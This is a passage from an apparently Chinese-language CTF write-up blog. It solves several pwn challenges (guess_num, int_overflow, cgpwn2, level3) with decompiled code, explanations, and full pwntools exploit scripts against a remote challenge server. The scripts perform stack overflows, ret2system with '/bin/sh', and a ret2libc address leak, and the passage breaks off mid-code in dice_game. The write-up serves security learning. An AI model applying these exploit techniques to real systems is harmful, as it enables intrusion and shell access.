undefined</span><br>-<span class="hljs-number">0000000000000014</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000013</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000012</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000011</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000010</span> seed            <span class="hljs-built_in">dd</span> <span class="hljs-number">2</span> dup(?)<br></code></pre></td></tr></table></figure><p>进入sub_C3E()</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">__int64</span> <span class="hljs-function"><span class="hljs-title">sub_C3E</span>()</span><br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">printf</span>(<span class="hljs-string">&quot;You are a prophet!\nHere is your flag!&quot;</span>);</span><br><span class="hljs-function">  <span class="hljs-title">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>);</span><br><span class="hljs-function">  <span class="hljs-variable">return</span> <span class="hljs-number">0</span><span class="hljs-variable">LL</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import*<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><span class="hljs-attribute">io</span>=remote(&#x27;111.198.29.45&#x27;,58633)<br><span class="hljs-comment">#io=process(&#x27;./guess_num&#x27;)</span><br><span class="hljs-comment">#elf=ELF(&#x27;guess_num&#x27;)</span><br><span class="hljs-comment">#libc=elf.libc</span><br><span class="hljs-comment">#libc= ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#或者libc=CDLL(&quot;XXX&quot;)<br>io.sendlineafter(<span class="hljs-string">&#x27;Your name:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x20+p64(1))<br><span class="hljs-comment">#libc.srand(1)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br>      io.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,str(libc.rand()%6 +1))<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>错误：AttributeError: ‘ELF’ object has no attribute ‘rand’，所以不能用ELF对象</p><p>可以使用LibraryLoader</p><h5 id="关于rand和srand"><a href="#关于rand和srand" class="headerlink" title="关于rand和srand"></a>关于rand和srand</h5><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br> 对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</p><h5 id="python调用c语言的函数库"><a href="#python调用c语言的函数库" class="headerlink" title="python调用c语言的函数库"></a>python调用c语言的函数库</h5><p>1.生成c语言函数</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">#Step <span class="hljs-number">1</span>:  test.c<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.编译动态链接库生成 libtest.so文件（DLL）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">gcc -fPIC -shared <span class="hljs-keyword">test</span>.c -o libtest.<span class="hljs-keyword">so</span>  <br></code></pre></td></tr></table></figure><p>3.调用DLL文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#Step 3:  test.py</span><br><span class="hljs-built_in">from</span> ctypes import *<br>mylib = CDLL(<span class="hljs-string">&quot;libtest.so&quot;</span>)   或者   cdll.LoadLibrary(<span class="hljs-string">&quot;libtest.so&quot;</span>)   <br><span class="hljs-built_in">add</span> = mylib.<span class="hljs-built_in">add</span><br><span class="hljs-built_in">add</span>.argtypes = [c_int, c_int]  <span class="hljs-comment"># 参数类型，两个int（c_int是ctypes类型，见上表）</span><br><span class="hljs-built_in">add</span>.restype = c_int <span class="hljs-comment"># 返回值类型，int (c_int 是ctypes类型，见上表）</span><br><span class="hljs-built_in">sum</span> = <span class="hljs-built_in">add</span>(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><p>具体参考：<a href="https://blog.csdn.net/awakeljw/article/details/79369703">python 与 C 的交互(ctypes库使用)</a></p><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">login</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-228h]</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+200h] [ebp-28h]</span><br><br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your username:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x19</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s\n&quot;</span>, &amp;s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your passwd:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x199</span>u);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">check_passwd</span>(&amp;buf);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *__cdecl <span class="hljs-title">check_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span><br><br>  v3 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Password&quot;</span>);<br>    result = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">fflush</span>(stdout);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    result = <span class="hljs-built_in">strcpy</span>(&amp;dest, s);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">what_is_this</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;cat flag&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>unsigned __int8就是1byte，8bits, 0~255</p><p>上面知道password最大长度为0x199,二进制是‭000110011001‬，大于一个字节，存在整数溢出</p><p>用个例子验证一下整数溢出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> b = <span class="hljs-number">65537</span>;<br>    <span class="hljs-keyword">if</span>(a == b)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Int overflow sucssesfully!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➤ gcc -g test.c -o test<br>test.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> ‘main’:<br>test.c:<span class="hljs-number">4</span>:<span class="hljs-number">28</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">large</span> <span class="hljs-type">integer</span> implicitly truncated <span class="hljs-keyword">to</span> unsigned <span class="hljs-keyword">type</span> [-Woverflow]<br>     unsigned short <span class="hljs-type">int</span> b = <span class="hljs-number">65537</span>;<br>                            ^<br>r3teax@ubuntu:~/Desktop                                                         <br>➤ ./test <br><span class="hljs-type">Int</span> overflow sucssesfully!<br></code></pre></td></tr></table></figure><p> 也就是说，对于一个2字节的unsigned short int 型变量，它的有效数据长度为2个字节，当它的数据长度超过2个字节时，就发生溢出，溢出的部分则直接忽略。使用相关变量时，使用的数据仅为最后2个字节，因此就会出现65537(‭00010000000000000001‬)等于1的情况，其他类型变量和数值与之类似。</p><p>这样我们可以把password长度安排在259-264之间</p><p>EXP:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">54685</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&#x27;username:&#x27;</span>,<span class="hljs-string">&#x27;aa&#x27;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span> + p32(<span class="hljs-number">0x804868b</span>) <br>payload = payload.ljust(<span class="hljs-number">259</span>,<span class="hljs-string">&quot;A&quot;</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&#x27;passwd:&#x27;</span>,payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h5 id="Python-ljust-方法"><a href="#Python-ljust-方法" class="headerlink" title="Python ljust()方法"></a>Python ljust()方法</h5><h6 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h6><p>Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p><h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6><p>ljust()方法语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">str<span class="hljs-selector-class">.ljust</span>(<span class="hljs-attribute">width</span><span class="hljs-selector-attr">[, fillchar]</span>)<br></code></pre></td></tr></table></figure><h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ul><li>width – 指定字符串长度。</li><li>fillchar – 填充字符，默认为空格。</li></ul><h6 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h6><p>返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p>以下实例展示了ljust()的使用方法：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python</span><br><br>str = <span class="hljs-string">&quot;this is string example....wow!!!&quot;</span>;<br><br>print str.ljust(<span class="hljs-number">50</span>, <span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure><p>以上实例输出结果如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">string</span> example....wow!!!<span class="hljs-number">000000000000000000</span><br></code></pre></td></tr></table></figure><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➤</span> <span class="hljs-string">checksec</span> <span class="hljs-string">cgctf</span> <br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/r3teax/Desktop/cgctf&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please tell me your name&quot;</span>);<br> <span class="hljs-built_in">fgets</span>(name, <span class="hljs-number">50</span>, stdin);<br> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hello,you can leave some message here:&quot;</span>);<br> <span class="hljs-keyword">return</span> <span class="hljs-built_in">gets</span>(&amp;s);<span class="hljs-comment">//s&#x27;buffer=0x26</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.bss</span>:<span class="hljs-number">0804</span>A080 ; char name<span class="hljs-selector-attr">[52]</span><br><span class="hljs-selector-class">.bss</span>:<span class="hljs-number">0804</span>A080 name            db <span class="hljs-number">34</span>h <span class="hljs-built_in">dup</span>(?)           ; DATA XREF: hello+<span class="hljs-number">77</span>↑o<br>.bss:<span class="hljs-number">0804</span>A080 _bss            ends<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">plt</span>:<span class="hljs-number">08048420</span> _system         endp<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">io</span>=remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;,<span class="hljs-number">49067</span>)<br><span class="hljs-attribute">system_addr</span>=<span class="hljs-number">0</span>x<span class="hljs-number">08048420</span><br><span class="hljs-attribute">name_addr</span>=<span class="hljs-number">0</span>x<span class="hljs-number">0804</span>A<span class="hljs-number">080</span><br><span class="hljs-attribute">payload</span>=&#x27;a&#x27;*<span class="hljs-number">42</span>+p<span class="hljs-number">32</span>(system_addr)+&#x27;aaaa&#x27;+p<span class="hljs-number">32</span>(name_addr)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;please tell me your name&quot;</span>,<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:&quot;</span>,payload)<br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">vulnerable_function</span>();<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World!\n&quot;</span>, <span class="hljs-number">0xE</span>u);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span><br><br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input:\n&quot;</span>, <span class="hljs-number">7u</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&#x27;111.198.29.45&#x27;,40752)<br><span class="hljs-attribute">libc</span>=ELF(&quot;libc_32.so.6&quot;)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./level3&quot;)<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">vul_addr</span>=elf.symbols[<span class="hljs-string">&#x27;vulnerable_function&#x27;</span>]<br><span class="hljs-attribute">payload</span>=140*&#x27;a&#x27;+p32(write_plt)+p32(vul_addr)+p32(1)+p32(write_got)+p32(4)<br>       4<br>    write_got<br>       1<br>    vul_addr            伪造write(1,write_got,4)<br>ret    write_plt<br>ebp    aaaa<br>    aaaaaaaaa<br>    <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<br>    aaaaaaaaa<br>    <br>io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)<br><span class="hljs-attribute">write_addr</span>=u32(io.recv(4))    #leak write<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span><span class="hljs-attribute">libc_off</span>=write_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">system_addr</span>=libc_off+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">binsh</span>=libc_off+libc.search(&quot;/bin/sh&quot;).next()<br><span class="hljs-attribute">payload1</span>=140*&quot;a&quot;+p32(system_addr)+&#x27;aaaa&#x27;+p32(binsh)<br>     /bin/sh<br>      aaaa<br> ret   system_addr         伪造system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br> ebp    aaaa      <br>    aaaaaaaaa<br>     <span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br>    aaaaaaaaa<br><br>io.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload1) <br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    No canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><h4 id="read"><a href="#read" class="headerlink" title="read():"></a>read():</h4><h5 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h5><p>ssize_t read [1] (int fd, void *buf, size_t count);</p><h5 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h5><p>成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0。</p><h5 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h5><p>参数count是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-keyword">char</span> flag; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-keyword">ssize_t</span> read_length; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome, let me know your name: &quot;</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  read_length = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( read_length &lt;= <span class="hljs-number">49</span> )<br>    buf[read_length - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, %s. Let&#x27;s play a game.\n&quot;</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  count = 